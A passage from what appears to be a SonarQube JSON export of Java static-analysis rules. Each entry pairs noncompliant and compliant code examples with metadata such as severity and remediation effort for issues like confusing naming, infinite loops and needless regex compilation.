            "mdDesc": "<p>Looking at the set of methods in a class, including superclass methods, and finding two methods or fields that differ only by capitalization is\nconfusing to users of the class. It is similarly confusing to have a method and a field which differ only in capitalization or a method and a field\nwith exactly the same name and visibility.</p>\n<p>In the case of methods, it may have been a mistake on the part of the original developer, who intended to override a superclass method, but instead\nadded a new method with nearly the same name.</p>\n<p>Otherwise, this situation simply indicates poor naming. Method names should be action-oriented, and thus contain a verb, which is unlikely in the\ncase where both a method and a member have the same name (with or without capitalization differences). However, renaming a public method could be\ndisruptive to callers. Therefore renaming the member is the recommended action.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Car{\n\n  public DriveTrain drive;\n\n  public void tearDown(){...}\n\n  public void drive() {...}  // Noncompliant; duplicates field name\n}\n\npublic class MyCar extends Car{\n  public void teardown(){...}  // Noncompliant; not an override. It it really what's intended?\n\n  public void drivefast(){...}\n\n  public void driveFast(){...} //Huh?\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Car{\n\n  private DriveTrain drive;\n\n  public void tearDown(){...}\n\n  public void drive() {...}  // field visibility reduced\n}\n\npublic class MyCar extends Car{\n  @Override\n  public void tearDown(){...}\n\n  public void drivefast(){...}\n\n  public void driveReallyFast(){...}\n\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S135",
            "repo": "java",
            "name": "Loops should not contain more than a single \"break\" or \"continue\" statement",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Restricting the number of <code>break</code> and <code>continue</code> statements in a loop is done in the interest of good structured programming.\n</p>\n<p>Only one <code>break</code> or one <code>continue</code> statement is acceptable in a loop, since it facilitates optimal coding. If there is more\nthan one, the code should be refactored to increase readability.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 1; i &lt;= 10; i++) {     // Noncompliant - 2 continue - one might be tempted to add some logic in between\n  if (i % 2 == 0) {\n    continue;\n  }\n\n  if (i % 3 == 0) {\n    continue;\n  }\n\n  System.out.println(\"i = \" + i);\n}\n</pre>",
            "mdDesc": "<p>Restricting the number of <code>break</code> and <code>continue</code> statements in a loop is done in the interest of good structured programming.\n</p>\n<p>Only one <code>break</code> or one <code>continue</code> statement is acceptable in a loop, since it facilitates optimal coding. If there is more\nthan one, the code should be refactored to increase readability.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 1; i &lt;= 10; i++) {     // Noncompliant - 2 continue - one might be tempted to add some logic in between\n  if (i % 2 == 0) {\n    continue;\n  }\n\n  if (i % 3 == 0) {\n    continue;\n  }\n\n  System.out.println(\"i = \" + i);\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "LINEAR",
            "defaultDebtRemFnCoeff": "20min",
            "effortToFixDescription": "per extra [\"break\" or \"continue\"|\"CONTINUE\", \"EXIT\", \"CHECK\"] statement",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR",
            "debtRemFnCoeff": "20min",
            "defaultRemFnType": "LINEAR",
            "defaultRemFnGapMultiplier": "20min",
            "remFnType": "LINEAR",
            "remFnGapMultiplier": "20min",
            "remFnOverloaded": false,
            "gapDescription": "per extra [\"break\" or \"continue\"|\"CONTINUE\", \"EXIT\", \"CHECK\"] statement",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1602",
            "repo": "java",
            "name": "Lambdas containing only one statement should not nest this statement in a block",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There are two ways to write lambdas that contain single statement, but one is definitely more compact and readable than the other.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nx -&gt; {System.out.println(x+1);}\n(a, b) -&gt; { return a+b; }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nx -&gt; System.out.println(x+1)\n(a, b) -&gt; a+b    //For return statement, the return keyword should also be dropped\n</pre>",
            "mdDesc": "<p>There are two ways to write lambdas that contain single statement, but one is definitely more compact and readable than the other.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nx -&gt; {System.out.println(x+1);}\n(a, b) -&gt; { return a+b; }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nx -&gt; System.out.println(x+1)\n(a, b) -&gt; a+b    //For return statement, the return keyword should also be dropped\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S138",
            "repo": "java",
            "name": "Methods should not have too many lines",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A method that grows too large tends to aggregate too many responsibilities. Such method inevitably become harder to understand and therefore harder\nto maintain.</p>\n<p>Above a specific threshold, it is strongly advised to refactor into smaller methods which focus on well-defined tasks. Those smaller methods will\nnot only be easier to understand, but also probably easier to test.</p>",
            "mdDesc": "<p>A method that grows too large tends to aggregate too many responsibilities. Such method inevitably become harder to understand and therefore harder\nto maintain.</p>\n<p>Above a specific threshold, it is strongly advised to refactor into smaller methods which focus on well-defined tasks. Those smaller methods will\nnot only be easier to understand, but also probably easier to test.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "max",
                    "htmlDesc": "Maximum authorized lines in a method",
                    "defaultValue": "75",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S139",
            "repo": "java",
            "name": "Comments should not be located at the end of lines of code",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be\nreally readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of\nthe code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.\nComments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint a1 = b + c; // This is a trailing comment that can be very very long\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// This very long comment is better placed before the line of code\nint a2 = b + c;\n</pre>",
            "mdDesc": "<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be\nreally readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of\nthe code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.\nComments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint a1 = b + c; // This is a trailing comment that can be very very long\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// This very long comment is better placed before the line of code\nint a2 = b + c;\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "legalTrailingCommentPattern",
                    "htmlDesc": "Description Pattern for text of trailing comments that are allowed. By default, comments containing only one word.",
                    "defaultValue": "^\\s*+[^\\s]++$",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3039",
            "repo": "java",
            "name": "\"String\" calls should not go beyond their bounds",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Just as you can't cut something into three halves, you can't grab a <code>substring</code> that starts or ends outside the original\n<code>String</code>'s bounds, you can't use <code>substring</code> to get a reversed portion of a <code>String</code>, and you can't get the\n<code>charAt</code> a value that's before the <code>String</code> starts or after it ends.</p>\n<p>This rule detects when negative literal or <code>String::length</code> is passed as an argument to the <code>String::substring</code>,\n<code>String::charAt</code> and related methods.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString speech = \"Now is the time for all good people to come to the aid of their country.\";\n\nString substr1 = speech.substring(-1, speech.length());  // Noncompliant; start and end values both bad\nString substr2 = speech.substring(speech.length(), 0); // Noncompliant, start value must be &lt; end value\nchar ch = speech.charAt(speech.length());  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString speech = \"Now is the time for all good people to come to the aid of their country.\";\n\nString substr1 = speech; // Closest correct values to original code yield whole string\nString substr2 = new StringBuilder(speech).reverse().toString()\nchar ch = speech.charAt(speech.length()-1);\n</pre>",
            "mdDesc": "<p>Just as you can't cut something into three halves, you can't grab a <code>substring</code> that starts or ends outside the original\n<code>String</code>'s bounds, you can't use <code>substring</code> to get a reversed portion of a <code>String</code>, and you can't get the\n<code>charAt</code> a value that's before the <code>String</code> starts or after it ends.</p>\n<p>This rule detects when negative literal or <code>String::length</code> is passed as an argument to the <code>String::substring</code>,\n<code>String::charAt</code> and related methods.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString speech = \"Now is the time for all good people to come to the aid of their country.\";\n\nString substr1 = speech.substring(-1, speech.length());  // Noncompliant; start and end values both bad\nString substr2 = speech.substring(speech.length(), 0); // Noncompliant, start value must be &lt; end value\nchar ch = speech.charAt(speech.length());  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString speech = \"Now is the time for all good people to come to the aid of their country.\";\n\nString substr1 = speech; // Closest correct values to original code yield whole string\nString substr2 = new StringBuilder(speech).reverse().toString()\nchar ch = speech.charAt(speech.length()-1);\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4248",
            "repo": "java",
            "name": "Regex patterns should not be created needlessly",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The <code>java.util.regex.Pattern.compile()</code> methods have a significant performance cost, and therefore should be used sensibly.</p>\n<p>Moreover they are the only mechanism available to create instances of the Pattern class, which are necessary to do any pattern matching using\nregular expressions. Unfortunately that can be hidden behind convenience methods like <code>String.matches()</code> or\n<code>String.split()</code>.</p>\n<p>It is therefore somewhat easy to inadvertently repeatedly compile the same regular expression at great performance cost with no valid reason.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> A <code>Pattern</code> is compiled from a <code>String</code> literal or constant and is not stored in a static final reference. </li>\n  <li> <code>String.matches</code>, <code>String.split</code>, <code>String.replaceAll</code> or <code>String.replaceFirst</code> are invoked with a\n  <code>String</code> literal or constant. In which case the code should be refactored to use a <code>java.util.regex.Pattern</code> while respecting\n  the previous rule. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doingSomething(String stringToMatch) {\n  Pattern regex = Pattern.compile(\"myRegex\");  // Noncompliant\n  Matcher matcher = regex.matcher(\"s\");\n  // ...\n  if (stringToMatch.matches(\"myRegex2\")) {  // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate static final Pattern myRegex = Pattern.compile(\"myRegex\");\nprivate static final Pattern myRegex2 = Pattern.compile(\"myRegex2\");\n\npublic void doingSomething(String stringToMatch) {\n  Matcher matcher = myRegex.matcher(\"s\");\n  // ...\n  if (myRegex2.matcher(stringToMatch).matches()) {\n    // ...\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p><code>String.split</code> doesn't create a regex when the string passed as argument meets either of these 2 conditions:</p>\n<ul>\n  <li> It is a one-char String and this character is not one of the RegEx's meta characters \".$|()[{^?*+\\\" </li>\n  <li> It is a two-char String and the first char is the backslash and the second is not the ascii digit or ascii letter. </li>\n</ul>\n<p>In which case no issue will be raised.</p>",
            "mdDesc": "<p>The <code>java.util.regex.Pattern.compile()</code> methods have a significant performance cost, and therefore should be used sensibly.</p>\n<p>Moreover they are the only mechanism available to create instances of the Pattern class, which are necessary to do any pattern matching using\nregular expressions. Unfortunately that can be hidden behind convenience methods like <code>String.matches()</code> or\n<code>String.split()</code>.</p>\n<p>It is therefore somewhat easy to inadvertently repeatedly compile the same regular expression at great performance cost with no valid reason.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> A <code>Pattern</code> is compiled from a <code>String</code> literal or constant and is not stored in a static final reference. </li>\n  <li> <code>String.matches</code>, <code>String.split</code>, <code>String.replaceAll</code> or <code>String.replaceFirst</code> are invoked with a\n  <code>String</code> literal or constant. In which case the code should be refactored to use a <code>java.util.regex.Pattern</code> while respecting\n  the previous rule. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doingSomething(String stringToMatch) {\n  Pattern regex = Pattern.compile(\"myRegex\");  // Noncompliant\n  Matcher matcher = regex.matcher(\"s\");\n  // ...\n  if (stringToMatch.matches(\"myRegex2\")) {  // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate static final Pattern myRegex = Pattern.compile(\"myRegex\");\nprivate static final Pattern myRegex2 = Pattern.compile(\"myRegex2\");\n\npublic void doingSomething(String stringToMatch) {\n  Matcher matcher = myRegex.matcher(\"s\");\n  // ...\n  if (myRegex2.matcher(stringToMatch).matches()) {\n    // ...\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p><code>String.split</code> doesn't create a regex when the string passed as argument meets either of these 2 conditions:</p>\n<ul>\n  <li> It is a one-char String and this character is not one of the RegEx's meta characters \".$|()[{^?*+\\\" </li>\n  <li> It is a two-char String and the first char is the backslash and the second is not the ascii digit or ascii letter. </li>\n</ul>\n<p>In which case no issue will be raised.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance",
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2188",
            "repo": "java",
            "name": "JUnit test cases should call super methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Overriding a parent class method prevents that method from being called unless an explicit <code>super</code> call is made in the overriding\nmethod. In some cases not calling the <code>super</code> method is acceptable, but not with <code>setUp</code> and <code>tearDown</code> in a JUnit 3\n<code>TestCase</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClassTest extends MyAbstractTestCase {\n\n  private MyClass myClass;\n    @Override\n    protected void setUp() throws Exception {  // Noncompliant\n      myClass = new MyClass();\n    }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClassTest extends MyAbstractTestCase {\n\n  private MyClass myClass;\n    @Override\n    protected void setUp() throws Exception {\n      super.setUp();\n      myClass = new MyClass();\n    }\n</pre>",
            "mdDesc": "<p>Overriding a parent class method prevents that method from being called unless an explicit <code>super</code> call is made in the overriding\nmethod. In some cases not calling the <code>super</code> method is acceptable, but not with <code>setUp</code> and <code>tearDown</code> in a JUnit 3\n<code>TestCase</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClassTest extends MyAbstractTestCase {\n\n  private MyClass myClass;\n    @Override\n    protected void setUp() throws Exception {  // Noncompliant\n      myClass = new MyClass();\n    }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClassTest extends MyAbstractTestCase {\n\n  private MyClass myClass;\n    @Override\n    protected void setUp() throws Exception {\n      super.setUp();\n      myClass = new MyClass();\n    }\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3038",
            "repo": "java",
            "name": "Abstract methods should not be redundant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There's no point in redundantly defining an <code>abstract</code> method with the same signature as a method in an <code>interface</code> that the\nclass <code>implements</code>. Any concrete child classes will have to implement the method either way.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface Reportable {\n  String getReport();\n}\n\npublic abstract class AbstractRuleReport implements Reportable{\n  public abstract String getReport();  // Noncompliant\n\n  // ...\n}\n</pre>",
            "mdDesc": "<p>There's no point in redundantly defining an <code>abstract</code> method with the same signature as a method in an <code>interface</code> that the\nclass <code>implements</code>. Any concrete child classes will have to implement the method either way.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface Reportable {\n  String getReport();\n}\n\npublic abstract class AbstractRuleReport implements Reportable{\n  public abstract String getReport();  // Noncompliant\n\n  // ...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S110",
            "repo": "java",
            "name": "Inheritance tree of classes should not be too deep",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Inheritance is certainly one of the most valuable concepts in object-oriented programming. It's a way to compartmentalize and reuse code by\ncreating collections of attributes and behaviors called classes which can be based on previously created classes. But abusing this concept by creating\na deep inheritance tree can lead to very complex and unmaintainable source code. Most of the time a too deep inheritance tree is due to bad object\noriented design which has led to systematically use 'inheritance' when for instance 'composition' would suit better.</p>\n<p>This rule raises an issue when the inheritance tree, starting from <code>Object</code> has a greater depth than is allowed. </p>\n<p>For the parameter of the rule, the following rules are applied:</p>\n<ul>\n  <li> <code>?</code> matches a single character </li>\n  <li> <code>*</code> matches zero or more characters </li>\n  <li> <code>**</code> matches zero or more packages </li>\n</ul>\n<p>Examples:</p>\n<ul>\n  <li> <code>java.fwk.AbstractFwkClass</code> will stop count when AbstractFwkClassclass is reached. </li>\n  <li> <code>java.fwkPackage.*</code> will stop count when any member of java.internal package is reached. </li>\n  <li> <code>java.fwkPackage.**</code> same as above, but including sub-packages. </li>\n</ul>",
            "mdDesc": "<p>Inheritance is certainly one of the most valuable concepts in object-oriented programming. It's a way to compartmentalize and reuse code by\ncreating collections of attributes and behaviors called classes which can be based on previously created classes. But abusing this concept by creating\na deep inheritance tree can lead to very complex and unmaintainable source code. Most of the time a too deep inheritance tree is due to bad object\noriented design which has led to systematically use 'inheritance' when for instance 'composition' would suit better.</p>\n<p>This rule raises an issue when the inheritance tree, starting from <code>Object</code> has a greater depth than is allowed. </p>\n<p>For the parameter of the rule, the following rules are applied:</p>\n<ul>\n  <li> <code>?</code> matches a single character </li>\n  <li> <code>*</code> matches zero or more characters </li>\n  <li> <code>**</code> matches zero or more packages </li>\n</ul>\n<p>Examples:</p>\n<ul>\n  <li> <code>java.fwk.AbstractFwkClass</code> will stop count when AbstractFwkClassclass is reached. </li>\n  <li> <code>java.fwkPackage.*</code> will stop count when any member of java.internal package is reached. </li>\n  <li> <code>java.fwkPackage.**</code> same as above, but including sub-packages. </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "design"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "max",
                    "htmlDesc": "Maximum depth of the inheritance tree. (Number)",
                    "defaultValue": "5",
                    "type": "INTEGER"
                },
                {
                    "key": "filteredClasses",
                    "htmlDesc": "Classes to be filtered out of the count of inheritance. Ex : java.fwk.AbstractFwkClass, java.fwkPackage.*",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "LINEAR_OFFSET",
            "defaultDebtRemFnCoeff": "30min",
            "defaultDebtRemFnOffset": "4h",
            "effortToFixDescription": "Number of parents above the defined threshold",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR_OFFSET",
            "debtRemFnCoeff": "30min",
            "debtRemFnOffset": "4h",
            "defaultRemFnType": "LINEAR_OFFSET",
            "defaultRemFnGapMultiplier": "30min",
            "defaultRemFnBaseEffort": "4h",
            "remFnType": "LINEAR_OFFSET",
            "remFnGapMultiplier": "30min",
            "remFnBaseEffort": "4h",
            "remFnOverloaded": false,
            "gapDescription": "Number of parents above the defined threshold",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3398",
            "repo": "java",
            "name": "\"private\" methods called only by inner classes should be moved to those classes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When a <code>private</code> method is only invoked by an inner class, there's no reason not to move it into that class. It will still have the same\naccess to the outer class' members, but the outer class will be clearer and less cluttered.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Outie {\n  private int i=0;\n\n  private void increment() {  // Noncompliant\n    i++;\n  }\n\n  public class Innie {\n    public void doTheThing() {\n      Outie.this.increment();\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Outie {\n  private int i=0;\n\n  public class Innie {\n    public void doTheThing() {\n      increment();\n    }\n\n    private void increment() {\n      Outie.this.i++;\n    }\n  }\n}\n</pre>",
            "mdDesc": "<p>When a <code>private</code> method is only invoked by an inner class, there's no reason not to move it into that class. It will still have the same\naccess to the outer class' members, but the outer class will be clearer and less cluttered.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Outie {\n  private int i=0;\n\n  private void increment() {  // Noncompliant\n    i++;\n  }\n\n  public class Innie {\n    public void doTheThing() {\n      Outie.this.increment();\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Outie {\n  private int i=0;\n\n  public class Innie {\n    public void doTheThing() {\n      increment();\n    }\n\n    private void increment() {\n      Outie.this.i++;\n    }\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2189",
            "repo": "java",
            "name": "Loops should not be infinite",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>An infinite loop is one that will never end while the program is running, i.e., you have to kill the program to get out of the loop. Whether it is\nby meeting the loop's end condition or via a <code>break</code>, every loop should have an end condition.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (;;) {  // Noncompliant; end condition omitted\n  // ...\n}\n\nint j;\nwhile (true) { // Noncompliant; end condition omitted\n  j++;\n}\n\nint k;\nboolean b = true;\nwhile (b) { // Noncompliant; b never written to in loop\n  k++;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint j;\nwhile (true) { // reachable end condition added\n  j++;\n  if (j  == Integer.MIN_VALUE) {  // true at Integer.MAX_VALUE +1\n    break;\n  }\n}\n\nint k;\nboolean b = true;\nwhile (b) {\n  k++;\n  b = k &lt; Integer.MAX_VALUE;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/lzZGBQ\">CERT, MSC01-J.</a> - Do not use an empty infinite loop </li>\n</ul>",
            "mdDesc": "<p>An infinite loop is one that will never end while the program is running, i.e., you have to kill the program to get out of the loop. Whether it is\nby meeting the loop's end condition or via a <code>break</code>, every loop should have an end condition.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (;;) {  // Noncompliant; end condition omitted\n  // ...\n}\n\nint j;\nwhile (true) { // Noncompliant; end condition omitted\n  j++;\n}\n\nint k;\nboolean b = true;\nwhile (b) { // Noncompliant; b never written to in loop\n  k++;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint j;\nwhile (true) { // reachable end condition added\n  j++;\n  if (j  == Integer.MIN_VALUE) {  // true at Integer.MAX_VALUE +1\n    break;\n  }\n}\n\nint k;\nboolean b = true;\nwhile (b) {\n  k++;\n  b = k &lt; Integer.MAX_VALUE;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/lzZGBQ\">CERT, MSC01-J.</a> - Do not use an empty infinite loop </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2068",
            "repo": "java",
            "name": "Hard-coded credentials are security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
